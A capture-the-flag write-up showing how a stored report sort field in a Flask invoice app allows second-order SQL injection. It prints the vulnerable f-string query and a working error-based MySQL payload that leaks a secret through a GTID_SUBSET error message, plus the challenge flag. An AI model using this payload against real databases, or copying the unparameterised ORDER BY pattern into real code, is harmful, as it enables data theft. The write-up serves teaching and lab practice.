## Description

The web app was a simple invoice and report manager. The clue about sorting reports "however you like" suggested the report's sort field might be handled unsafely.

![The Second challenge card](writeups/ukiddgj/img/init-second.webp)

Target was `http://172.198.60.104:8082`, with the source in `handout.zip`.

## Investigation

I read the Flask source in `ledgerlite/routes/reports.py`. In the report-run endpoint, the query is built by dropping the user-controlled sort expression straight in:

```python
rows = db.query_all(
    "SELECT id, label, amount, status, created_at FROM invoices "
    f"WHERE user_id = {user['id']} ORDER BY {report['sort_key']}"
)
```

The report gets saved first, but its `sort_key` is later inserted into SQL with no parameterization and no column allowlist. That makes it a **second-order SQL injection**: the payload is stored, then executed when the report runs.

The schema also had a `flags` table with `id` and `flag_value`, filled in by the server at runtime.

## Exploitation

I registered, added an invoice, created a report, and put this in the sort expression:

```sql
GTID_SUBSET((SELECT flag_value FROM flags WHERE id=1),'')
```

After saving and running the report, MySQL leaked the flag inside its error message:

```text
Report failed: (1772, "Malformed GTID set specification 'InIt{s3c0nd_0rd3r_1nj3ct10n}'.")
```

`GTID_SUBSET()` tried to parse the private flag as a GTID set, and the error echoed it back.

## Flag

```flag
InIt{s3c0nd_0rd3r_1nj3ct10n}
```

## Takeaway

User-controlled SQL expressions need a strict allowlist. Parameterizing the other inputs doesn't protect a dynamic `ORDER BY`.
